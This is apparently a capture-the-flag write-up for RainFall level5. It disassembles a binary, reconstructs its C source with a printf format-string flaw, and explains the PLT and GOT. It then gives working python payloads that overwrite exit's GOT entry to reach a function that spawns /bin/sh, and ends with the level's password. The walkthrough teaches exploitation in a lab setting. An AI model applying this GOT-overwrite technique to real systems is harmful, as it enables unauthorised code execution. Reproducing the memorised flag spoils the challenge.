## level5 TODO NOTES
Below is an objdump for the level5 program.
```
080484a4 <o>:
 80484a4:       55                      push   ebp
 80484a5:       89 e5                   mov    ebp,esp
 80484a7:       83 ec 18                sub    esp,0x18
 80484aa:       c7 04 24 f0 85 04 08    mov    DWORD PTR [esp],0x80485f0
 80484b1:       e8 fa fe ff ff          call   80483b0 <system@plt>
 80484b6:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 80484bd:       e8 ce fe ff ff          call   8048390 <_exit@plt>

080484c2 <n>:
 80484c2:       55                      push   ebp
 80484c3:       89 e5                   mov    ebp,esp
 80484c5:       81 ec 18 02 00 00       sub    esp,0x218
 80484cb:       a1 48 98 04 08          mov    eax,ds:0x8049848
 80484d0:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80484d4:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 80484db:       00
 80484dc:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484e2:       89 04 24                mov    DWORD PTR [esp],eax
 80484e5:       e8 b6 fe ff ff          call   80483a0 <fgets@plt>
 80484ea:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484f0:       89 04 24                mov    DWORD PTR [esp],eax
 80484f3:       e8 88 fe ff ff          call   8048380 <printf@plt>
 80484f8:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 80484ff:       e8 cc fe ff ff          call   80483d0 <exit@plt>

08048504 <main>:
 8048504:       55                      push   ebp
 8048505:       89 e5                   mov    ebp,esp
 8048507:       83 e4 f0                and    esp,0xfffffff0
 804850a:       e8 b3 ff ff ff          call   80484c2 <n>
 804850f:       c9                      leave
 8048510:       c3                      ret
 8048511:       90                      nop
 8048512:       90                      nop
 8048513:       90                      nop
 8048514:       90                      nop
 8048515:       90                      nop
 8048516:       90                      nop
 8048517:       90                      nop
 8048518:       90                      nop
 8048519:       90                      nop
 804851a:       90                      nop
 804851b:       90                      nop
 804851c:       90                      nop
 804851d:       90                      nop
 804851e:       90                      nop
 804851f:       90                      nop
 ```

Based on the dump, the source code can de deduced like so 
```clike=
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
    
void o()
{
    // 80484b1
    system("/bin/sh");
}

void n()
{
    char buf[512];
    
    // 80484e5
    fgets(buf, 512, stdin);
    
    // 80484f3
    printf(buf);
    
    exit(1);
}

int main()
{
    // 804850a
    n();
}
```

This is abit tricky, as after the format string vuln at printf follows an exit call, which ignores the saved EIP.

I tried to look for .dtor function as suggested by the book, but there is no avail, however, the **Overwriting the Global Offset Table** did mention something 

![image](https://hackmd.io/_uploads/H1s032trp.png)

This implies that we are able to **manipulate the jump instructions for the exit() function to jump somewhere else, potentially to shellcode.**.

This is a special section in compiled programs called the **PLT (procedure linkage table)** which consists of many jump instructions, each one corresponding to the address of a function. Each time a **shared function needs to be called**, control will pass through the PLT.

The PLT section of our binary looks like this
```
Disassembly of section .plt:

08048370 <printf@plt-0x10>:
 8048370:       ff 35 1c 98 04 08       push   DWORD PTR ds:0x804981c
 8048376:       ff 25 20 98 04 08       jmp    DWORD PTR ds:0x8049820
 804837c:       00 00                   add    BYTE PTR [eax],al
        ...

08048380 <printf@plt>:
 8048380:       ff 25 24 98 04 08       jmp    DWORD PTR ds:0x8049824
 8048386:       68 00 00 00 00          push   0x0
 804838b:       e9 e0 ff ff ff          jmp    8048370 <_init+0x3c>

08048390 <_exit@plt>:
 8048390:       ff 25 28 98 04 08       jmp    DWORD PTR ds:0x8049828
 8048396:       68 08 00 00 00          push   0x8
 804839b:       e9 d0 ff ff ff          jmp    8048370 <_init+0x3c>

080483a0 <fgets@plt>:
 80483a0:       ff 25 2c 98 04 08       jmp    DWORD PTR ds:0x804982c
 80483a6:       68 10 00 00 00          push   0x10
 80483ab:       e9 c0 ff ff ff          jmp    8048370 <_init+0x3c>

080483b0 <system@plt>:
 80483b0:       ff 25 30 98 04 08       jmp    DWORD PTR ds:0x8049830
 80483b6:       68 18 00 00 00          push   0x18
 80483bb:       e9 b0 ff ff ff          jmp    8048370 <_init+0x3c>

080483c0 <__gmon_start__@plt>:
 80483c0:       ff 25 34 98 04 08       jmp    DWORD PTR ds:0x8049834
 80483c6:       68 20 00 00 00          push   0x20
 80483cb:       e9 a0 ff ff ff          jmp    8048370 <_init+0x3c>

080483d0 <exit@plt>:
 80483d0:       ff 25 38 98 04 08       jmp    DWORD PTR ds:0x8049838
 80483d6:       68 28 00 00 00          push   0x28
 80483db:       e9 90 ff ff ff          jmp    8048370 <_init+0x3c>

080483e0 <__libc_start_main@plt>:
 80483e0:       ff 25 3c 98 04 08       jmp    DWORD PTR ds:0x804983c
 80483e6:       68 30 00 00 00          push   0x30
 80483eb:       e9 80 ff ff ff          jmp    8048370 <_init+0x3c>
```
as we can see, it contains all the jump instruction for our standard library calls. In most cases, the PLT of programs are **read only**, which can be checked like so 
```
level5@RainFall:~$ objdump -h ./level5 | grep -A1 "\ .plt\ "
 11 .plt          00000080  08048370  08048370  00000370  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
level5@RainFall:~$
```

However, upon closer inspection, the address that the PLT entries jump to isnt to the function instruction themselves, but **rather pointers to the function instructions** (notice how they derefrences the addresses when jumping). These addresses exist in another section, called the **global offset table (GOT)**, which is writable. These addresses can be directly obtained by displaying the **dynamic relocation entries** for the binary by using objdump. `objdump -R ./level5`

```
./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

This shows that the address `0x08049838` will be onw one getting called. We can overwrite the value of this address using printf to the instruction for the `o()` function, which is `0x080484a4` based on the disassembly objdump.

Now we know where to write to and what to write, its time to go over the procesures of
1. Generate mapping of address to determine how many times we want to write
2. Finding the format string (first arg) value location
3. Calculate number of bytes written and generate payload

The mapping/segmentation `080484a4` should look like this
```
0x08049838 - 0x4a4
0x08049839 - 0x8048
```

with the input `BBBB%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x`, I got this output `BBBB200 b7fd1ac0 b7ff37d0 42424242 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 a`, which indicates that the first args value is at the foruth call of %x.

Using the following input
`python -c "print '\x08\x04\x98\x38'[::-1] + '\x08\x04\x98\x3a'[::-1] + '%1180x' + '%4\$n' + '%31652x' + '%5\$n'" > /tmp/level5`, I did not get the results I want. Because **by default, %n writes 4 bytes, which causes overlaps on smaller values**
![image](https://hackmd.io/_uploads/S1aqYpYSa.png)

So, we need to find a way to make it so that the values dont overlap each other. There is a way to make **%n write as short, using %hhn for 1 byte, and %hn for 2 bytes**.
The new mapping/segmentation `080484a4` should look like this
```
0x08049839 - 0x84
0x08049838 - 0xa4
0x0804983a - 0x804
```
As well as the new input
`python -c "print '\x08\x04\x98\x39'[::-1] + '\x08\x04\x98\x38'[::-1] +  '\x08\x04\x98\x3a'[::-1] + '%120x' + '%4\$hhn' + '%32x' + '%5\$hhn' + '%1888x' + '%6\$n' " > /tmp/level5`

![image](https://hackmd.io/_uploads/SJWcjTtS6.png)

And viola, we got ourselves the overwrite we want. Now to open stdin to the program..

![image](https://hackmd.io/_uploads/ryJasaKBT.png)

The password is 
`d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
